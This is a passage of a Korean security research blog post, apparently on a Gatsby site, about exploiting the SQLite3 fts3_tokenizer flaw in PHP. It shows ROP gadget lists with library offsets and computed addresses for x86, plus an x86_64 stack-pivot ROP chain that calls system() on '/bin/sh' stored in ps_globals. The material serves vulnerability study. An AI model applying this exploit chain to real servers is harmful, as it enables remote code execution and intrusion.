punctuation\">)</span>\nmov [edx<span class=\"token number\">+0x18</span>], eax ; ret   --------> libc-2_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x004e3642</span><span class=\"token punctuation\">)</span>     -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x2a642</span><span class=\"token punctuation\">)</span>  -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xa0d642</span><span class=\"token punctuation\">)</span>\n\n## <span class=\"token keyword\">call</span> system\npop eax ; ret               --------> libsqlite3_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x00305337</span><span class=\"token punctuation\">)</span> -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x82337</span><span class=\"token punctuation\">)</span>     -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xe9c337</span><span class=\"token punctuation\">)</span>\n;lib_system                 --------> libc<span class=\"token number\">-2</span><span class=\"token number\">+0x3af60</span>                                       -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xa1df60</span><span class=\"token punctuation\">)</span>\npop esi ; ret               --------> libphp5_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x000d5902</span><span class=\"token punctuation\">)</span>    -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x000d5902</span><span class=\"token punctuation\">)</span>  -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xb71a8902</span><span class=\"token punctuation\">)</span>\n;writable <span class=\"token keyword\">memory</span>            --------> libsqlite3<span class=\"token number\">+0x8eaa0</span>                                   -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xea8aa0</span><span class=\"token punctuation\">)</span>\npush esi ; <span class=\"token keyword\">call</span> eax;        --------> libphp5_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x0029eb07</span><span class=\"token punctuation\">)</span>    -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x0029eb07</span><span class=\"token punctuation\">)</span>  -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xb7371b07</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>해당 가젯들은 노출된 메모리 주소에서 offset 계산을 통해 가젯을 선정한 후 쓰기 가 가능한 공간으로 <code class=\"language-text\">libcsqlite3</code> .bss 섹션을 활용합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/ElEQVQY01WQSU/CYBRFP8HZhUOiCwIqKlBKoS0dgTKUwVKQAgJGMSb+/z9xTL+di7N4ycu5N1c43pCK6qCbXbzWGL89ofBQkyxWewajBZnDa1TNJ1ntMaweB9kr2kHEevPDfVHj+PSWcJwwne0QptWjWnPRzQDLDSUNM+CpZBDFG7r9GdmjGxTVJZ7vaBiBDHD9MfPkk8KjxsnZHeEoIYq3iKbdl8+p0HZDSV3v8Fw2Wa6/GQwXCHFBperIRqlQiHP8zivbj19y+Soic8kkeudt+YWwveE/oeUM0JtdcnmF4osup1DkJAGliiXbp3cqLis2daODqnnU6i3JH5h2f2FmvciIAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/0c5aaf84765af8a9c30679d4c05294dd/37523/14.png\"\n        srcset=\"/static/0c5aaf84765af8a9c30679d4c05294dd/e9ff0/14.png 180w,\n/static/0c5aaf84765af8a9c30679d4c05294dd/f21e7/14.png 360w,\n/static/0c5aaf84765af8a9c30679d4c05294dd/37523/14.png 720w,\n/static/0c5aaf84765af8a9c30679d4c05294dd/715a3/14.png 830w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">edx</code> 레지스터에 대입된 <code class=\"language-text\">sqlite3SavedPrng</code> 주소 +0x18 번지로 역참조된 값에 하드 코딩된 값을 집어넣었습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 41.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABsElEQVQozzVRa3OaUBC9aZq2aSoBY2ulxGiiCEbEIKCCNqLGV0TGaGKtfXzo9P//hNPZdfqBWe7uztnzELV6B+3gAfZdD64foelH0A0Xnz6X8CVfRUl3ULyxcVO+gyRf4vQsi+tSA7rR5NlV0cKr1wqOjmWuouH0EPamKFcctMMx/PYQQXeCiumhVg8wX7xgOt8gTr4jX7SQkjWMp2vEyY5799ECxydpBmNA89ZH0+szCwKvN0I47j1004VR9TGZbTAYJVxVzcSbdx8Z5GHyxH1SJUQK4kg6ANbsAN2vM6bvtYZw3D6zpD5Jc7w+ouESy9Uelh3yYbKFVDzGW56plybkdJ5lC2IXjZaoVD10wjF/QW8KrzXAuZKHEO/R6oywfv6N1eYXtrs/3M/mdH6v1j+x2//lfWZK8uiKQYDdCQNSSLSgXFyxFGKcrPZ4jL9xVS4KyGkGe7hY7pA8/WC7GPDWOqRMKRJbGtAR+pdkjZfoPVu8cBjzeMvysrkyh0XeknTLDiCEdAiFQMlD1x+gcF2HqhlQMgWcpVRO8IOkIp0pMGOqJ28zHA4x/d+jXfLwH6xn97mP1bOQAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"asd.png\"\n        title=\"asd.png\"\n        src=\"/static/004ea3989fb2f251c19019243f3e9b52/37523/asd.png\"\n        srcset=\"/static/004ea3989fb2f251c19019243f3e9b52/e9ff0/asd.png 180w,\n/static/004ea3989fb2f251c19019243f3e9b52/f21e7/asd.png 360w,\n/static/004ea3989fb2f251c19019243f3e9b52/37523/asd.png 720w,\n/static/004ea3989fb2f251c19019243f3e9b52/5a6dd/asd.png 802w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 639px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 51.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABeElEQVQoz42SWXOCQBCEUWO8oiIKiOKNFx4cCqKo8Uoqlcr//zudmjHxQS2Th66dpXa/7ZlGqDVGMMcBxtYKU2cNvW5CklvIZDVo1T6iTwVWJCZe6kcSnpMyJtYKc38Pb3GArHYwsUOIUh1tw2aQEMlfoH+BhXiiBH95wmb3idf9Fyr6kB0X5Tb6Q49dJlIyBCF7gT2CMpAu2u4WUztEodiE0XMZPLXXCFZvMHoOkmkVsbj0H4dF2O4GXnDklpWyAW9x5EeC8B3h5gOWuwHNOpVRb4DXe57hfHHAYnmC6+1QrvR4djRLPzjBD45wZlv0TQ90lloXIrmzorezFZrtKcxJwA5yoo5MtoJ0VkP6ReNgSkqHXZMKxcbPtzbXybRy65DaJXczb4eB6UHTBxeXBKEHcmINUqnFQeULZyDVqUz5FjiaLHnwlrPGwPTZqap1WRV9wP8jBcIt/rZLK+ley5QoQQlAjmilg3SB6mptCKXc5YTvpXrt8Butyv1aAcVepwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/96c1b55ba8a6a3f9c6e2e70aa1721161/738b8/15.png\"\n        srcset=\"/static/96c1b55ba8a6a3f9c6e2e70aa1721161/e9ff0/15.png 180w,\n/static/96c1b55ba8a6a3f9c6e2e70aa1721161/f21e7/15.png 360w,\n/static/96c1b55ba8a6a3f9c6e2e70aa1721161/738b8/15.png 639w\"\n        sizes=\"(max-width: 639px) 100vw, 639px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>가젯 들이 동작을 하면서 마지막으로 시스템 라이브러를 호출하여 Code Execution을 수행합니다.</li>\n</ul>\n<h1 id=\"x86_64bit-환경-php-sqlite3-fts3-tokenizer-rce-취약점\" style=\"position:relative;\"><a href=\"#x86_64bit-%ED%99%98%EA%B2%BD-php-sqlite3-fts3-tokenizer-rce-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"x86_64bit 환경 php sqlite3 fts3 tokenizer rce 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>x86_64bit 환경 PHP SQLite3 fts3 tokenizer RCE 취약점</h1>\n<ul>\n<li>앞서 x86 환경에서의 공통된 취약점을 이용하며 새로운 가젯을 사용해 xCreate의 콜백 함수를 조절해서 원하는 페이로드를 실행하여 RCE를 수행해봅시다.</li>\n</ul>\n<h3 id=\"rop를-활용해서-시스템-라이브러리-함수-호출-진행\" style=\"position:relative;\"><a href=\"#rop%EB%A5%BC-%ED%99%9C%EC%9A%A9%ED%95%B4%EC%84%9C-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EB%9D%BC%EC%9D%B4%EB%B8%8C%EB%9F%AC%EB%A6%AC-%ED%95%A8%EC%88%98-%ED%98%B8%EC%B6%9C-%EC%A7%84%ED%96%89\" aria-label=\"rop를 활용해서 시스템 라이브러리 함수 호출 진행 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ROP를 활용해서 시스템 라이브러리 함수 호출 진행</h3>\n<ul>\n<li>64bit 환경은 32bit 환경과 다르게 레지스터를 활용해서 인자를 주고 받기 때문에 ROP 구조를 새로 구성합니다.</li>\n<li><code class=\"language-text\">[libphp5.so](http://libphp5.so)</code> 공유 라이브러리 안에 실행 권한이 있는 부분의 가젯들을 이용해서 ROP Chain을 설계 해봅시다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">leave<span class=\"token punctuation\">;</span>                     <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>        <span class=\"token property\">stack</span> pivot\nret<span class=\"token punctuation\">;</span>                       <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>        <span class=\"token property\">payload</span><span class=\"token operator\">-></span><span class=\"token property\">esp</span>\n\npop rax<span class=\"token punctuation\">;</span>                   <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>        <span class=\"token property\">rax</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> system_lib\npop rbx<span class=\"token punctuation\">;</span>                   <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>        <span class=\"token property\">rbx</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> wirtable <span class=\"token function\">memory</span><span class=\"token punctuation\">(</span>Cookie_path<span class=\"token punctuation\">)</span>\nret<span class=\"token punctuation\">;</span>\n\nmov rdi<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>rbx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>            <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>        <span class=\"token property\">rdi</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> <span class=\"token punctuation\">[</span>rbx<span class=\"token punctuation\">]</span> <span class=\"token function\">address</span><span class=\"token punctuation\">(</span>writalbe memory<span class=\"token punctuation\">)</span>\ncall rax<span class=\"token punctuation\">;</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA3ElEQVQY022QaQuCQBCGzSxLzQPL1qwktYMOy+iQLiio//+P3pipKMgPLzuzMM8+s1KrHWO1vmCzu6IXzlDT2gijFJrhc+q6QEVtQqm6nE8tKw5KZZvP30gESLMT8sMd8TCD3uggGa25jpIVwsECpt2FJFswzACOG4Ik1LoHSS4AksUyOyM/PhhEvScSTOc5h2oaJht6XG/4DFZUt9hQM8QL+DakFQkyme6w2d8wiJdsSMOW00dLJBDBmOFk/QckwDw9YLu/8XrUE8QPxrxa04v47mvYgWn3+C+LDJ+LM32NwjeMOAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/a71eafd63c47699567611c2dc9fba1ec/37523/16.png\"\n        srcset=\"/static/a71eafd63c47699567611c2dc9fba1ec/e9ff0/16.png 180w,\n/static/a71eafd63c47699567611c2dc9fba1ec/f21e7/16.png 360w,\n/static/a71eafd63c47699567611c2dc9fba1ec/37523/16.png 720w,\n/static/a71eafd63c47699567611c2dc9fba1ec/024d6/16.png 961w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Stack Pivot 가젯을 이용해서 <code class=\"language-text\">ps_globals</code> 구조체의 주소 값을 스택 메모리 상으로 변경하여 ps_globals에 저장되어 있는 필드들을 확인할 수 가 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABZklEQVQoz3WRa0sCURCGj1oRkZmmqOtdS1td9+Kqu7quq+s188aKJSEI/f//8MYZ8INFHw4Mh+GZZ95hYq0NSe5C0XoQawYkuYOEUIGQfkW+KKMsNpFMVRAMpRCLlxCJFhB+yiNwHYEv8Aj/VfjiMbVho22Ooel96K0BmoaLXFFGtzeDZc/huEsCCRkRk5kH21nAtKa4uY39A9T7aJsjKA0bstojaFUy4AyXGE23mMw9xJNlJIQyVpsvuOMNOtaUYMwXIgivz3AmqxYaTQd1xaK1taaDithCLP4MRbOxXB9gdifgfZlcDb3+Gw3iwyPRPJg/dGnIYS3DJUO+Nq95pozdIZ2tYusdsdufaF1uwc033hEfh2+8VHQwdn8JrKsW1EYfVckkC56pKBk0OZuXCMQhXXtGufH8pvMd5os9HY2x4G/DAWV4PgqvOZT5HlAoKWTzvvrEcLwm4MBd0Z+3P6FU1v4Y/gAHWs8nUgHCoAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/5442c0b2654c4bd8a7d96d1b3fe4237c/37523/17.png\"\n        srcset=\"/static/5442c0b2654c4bd8a7d96d1b3fe4237c/e9ff0/17.png 180w,\n/static/5442c0b2654c4bd8a7d96d1b3fe4237c/f21e7/17.png 360w,\n/static/5442c0b2654c4bd8a7d96d1b3fe4237c/37523/17.png 720w,\n/static/5442c0b2654c4bd8a7d96d1b3fe4237c/a0b80/17.png 955w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>시스템 라이브러리 함수를 호출하기 위해서 스택상에 있는 시스템 라이브러리를 rax 레지스터가 가리키는 형태로 진행 하였습니다.</li>\n<li>후, rbx 레지스터를 이용해서 Cookie_path 필드에 삽입한 문자열을 가리키는 주소를 대입합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA9klEQVQY04WRa1OCQBSGV+1muFwsaAMk0kpBQsQNJJTsMtX//0Nvs2caPjn64Z2deefMs8/ZZbncIc02kMU7kvQVjHFww4Nu+tC4C43fUtfpmZTuidWe+8Kesxpl9YWq/ka1+aFh4T5hFhewrkIEYYK+JtA7HR6FETBOSqxedsjlG5K0otK+mcAPYozu5qibX2T5luwHugvWNY4B1wRTWSy3ZOCIB9xPFvBGEYr1J9SMMj27sME6emu6z5ZF/4Yqy1XTAsNxCuFNIcsPehJ1oTI/79uHDaeRxGxeIMsbWkuV186YDB3xSGBzGIAbPgwrwOVAHPyUPw09mgtiwo4CAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/890cf5761cf6bfb3256b501faa2bc1c6/37523/18.png\"\n        srcset=\"/static/890cf5761cf6bfb3256b501faa2bc1c6/e9ff0/18.png 180w,\n/static/890cf5761cf6bfb3256b501faa2bc1c6/f21e7/18.png 360w,\n/static/890cf5761cf6bfb3256b501faa2bc1c6/37523/18.png 720w,\n/static/890cf5761cf6bfb3256b501faa2bc1c6/62de4/18.png 746w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">ps_globals</code> cookie_path 필드는 삽입한 페이로드를 가리키는 포인터이기 때문에 rbx 레지스터에 대입을 한 후 참조하는 과정이 필요합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token number\">0x7ff9d4cefbc0</span> <span class=\"token operator\">&lt;</span>ps_globals<span class=\"token operator\">+</span><span class=\"token number\">64</span><span class=\"token operator\">></span><span class=\"token punctuation\">:</span>  <span class=\"token operator\">=></span> <span class=\"token number\">0x00007ff9d8b15908</span>\n\n<span class=\"token number\">0x00007ff9d8b15908</span> <span class=\"token operator\">=></span>  <span class=\"token string double-quoted-string\">\"/bin/sh\"</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAjElEQVQI112ObwuCMBjEV5qE2dga/RuFWdKb0E2tIFhR3/9DXTyDifjixz3cwx3HbtULdeNQW4c02yOZr8HFERnX2OxKSHXy3iQSmMYS0WzlNdxE+BHMNA735w+mffvwYqlxLi2Ki4FtP9jqK+JE9SHSMUOf0bLu8e0LaWVeVODiAKlyXxYCYcWY4cI/TMBJZVzFvA4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/72796d74fdfa4002b09dd9c30cdc6621/37523/19.png\"\n        srcset=\"/static/72796d74fdfa4002b09dd9c30cdc6621/e9ff0/19.png 180w,\n/static/72796d74fdfa4002b09dd9c30cdc6621/f21e7/19.png 360w,\n/static/72796d74fdfa4002b09dd9c30cdc6621/37523/19.png 720w,\n/static/72796d74fdfa4002b09dd9c30cdc6621/ddc81/19.png 837w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>rbx 레지스터를 참조한 값을 호출 규약에 맞게 rdi 레지스터에 mov 명령을 통해 대입한 후 code execution을 실행합니다.</li>\n</ul>\n<h1 id=\"참조\" style=\"position:relative;\"><a href=\"#%EC%B0%B8%EC%A1%B0\" aria-label=\"참조 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>참조</h1>\n<hr>\n<p><a href=\"https://i.blackhat.com/USA-19/Thursday/us-19-Qian-Exploring-The-New-World-Remote-Exploitation-Of-SQLite-And-Curl-wp.pdf\">us 19 Qian Exploring The New World Remote Exploitation Of SQLite And Curl wp</a></p>\n<p><a href=\"https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf\">us 17 Feng Many Birds One Stone Exploiting A Single SQLite Vulnerability Across Multiple Software</a></p>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#php-sandbox\">PHP Sandbox</a></p>\n<ul>\n<li><a href=\"#php-debugging\">PHP Debugging</a></li>\n<li><a href=\"#safe-mode-bypass\">Safe Mode Bypass</a></li>\n<li><a href=\"#php-sqlite-%EB%AA%A8%EB%93%88-php-53\">PHP SQLite 모듈 (PHP 5.3≥)</a></li>\n<li><a href=\"#fts3_tokenizer-overview\">fts3_tokenizer Overview</a></li>\n<li><a href=\"#sqlite-fts3-%EA%B8%B0%EB%8A%A5%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-%EA%B2%80%EC%83%89-%EB%B0%A9%EC%95%88\">SQLite fts3 기능을 활용한 검색 방안</a></li>\n<li><a href=\"#%EC%82%AC%EC%9A%A9%EC%9E%90%EA%B0%80-%EC%A7%80%EC%A0%95%ED%95%A0-%EC%88%98-%EC%9E%88%EB%8A%94-tokenizer%EC%9D%98-callback-%EC%B2%98%EB%A6%AC-%EB%B0%A9%EC%8B%9D\">사용자가 지정할 수 있는 tokenizer의 Callback 처리 방식</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#sqlite-fts3-%EC%B7%A8%EC%95%BD%EC%A0%90\">SQLite fts3 취약점</a></p>\n<ul>\n<li><a href=\"#fts3-module-base-address-leaked\">fts3 module base address leaked</a></li>\n<li><a href=\"#sqlite-fts3_tokenizer-fts3_tokenizer\">SQLite fts3_tokenizer(), fts3_tokenizer()</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#fts3-callback%EC%9D%84-%ED%86%B5%ED%95%9C-%EC%9E%84%EC%9D%98%EC%9D%98-%EC%BD%94%EB%93%9C-%EC%8B%A4%ED%96%89-%EC%B7%A8%EC%95%BD%EC%A0%90\">fts3 callback을 통한 임의의 코드 실행 취약점</a></p>\n</li>\n<li>\n<p><a href=\"#xopen-%EC%B7%A8%EC%95%BD%EC%A0%90\">xOpen 취약점</a></p>\n</li>\n<li>\n<p><a href=\"#exploit-%EA%B3%B5%EA%B2%A9-%ED%9D%90%EB%A6%84%EB%8F%84\">Exploit 공격 흐름도</a></p>\n</li>\n<li>\n<p><a href=\"#x86bit-%ED%99%98%EA%B2%BD-php-with-sqlite3-fts3-tokenizer-rce-%EC%B7%A8%EC%95%BD%EC%A0%90\">x86bit 환경 PHP with SQLite3 fts3 tokenizer RCE 취약점</a></p>\n<ul>\n<li><a href=\"#fts3_tokenizer-info-leak\">fts3_tokenizer info leak</a></li>\n<li><a href=\"#fts3-tokenizer-callback\">fts3 tokenizer callback</a></li>\n<li><a href=\"#fts3-tokenizer-%EB%91%90-%EB%B2%88%EC%A7%B8-%EC%9D%B8%EC%9E%90-ebp-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0-%EC%A1%B0%EC%9E%91\">fts3 tokenizer 두 번째 인자 ebp 레지스터 조작</a></li>\n<li><a href=\"#stack-pivot%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-payload-data-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EC%9C%84%EC%B9%98-%EB%B3%80%EA%B2%BD-%EC%9E%91%EC%97%85\">Stack Pivot를 이용한 Payload data 메모리 위치 변경 작업</a></li>\n<li><a href=\"#rop-%EA%B8%B0%EB%B2%95%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%98%EC%97%AC-rce-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%88%98%ED%96%89\">ROP 기법을 활용하여 RCE 취약점 수행</a></li>\n<li><a href=\"#rop%EB%A5%BC-%ED%99%9C%EC%9A%A9%ED%95%B4%EC%84%9C-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EB%9D%BC%EC%9D%B4%EB%B8%8C%EB%9F%AC%EB%A6%AC-%ED%95%A8%EC%88%98-%ED%98%B8%EC%B6%9C-%EC%A7%84%ED%96%89\">ROP를 활용해서 시스템 라이브러리 함수 호출 진행</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 20, 2020","title":"SQLite3 fts3_tokenizer() Remote Code Execution 취약점 연구","categories":"Web","author":"Zer0Luck","emoji":"🥙"},"fields":{"slug":"/php-sqlite3-1day-rce/"}},"prev":{"id":"6ddfd1b2-808b-5d18-b643-d305593f1a71","html":"<h1 id=\"seh-structured-exception-handler\" style=\"position:relative;\"><a href=\"#seh-structured-exception-handler\" aria-label=\"seh structured exception handler permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 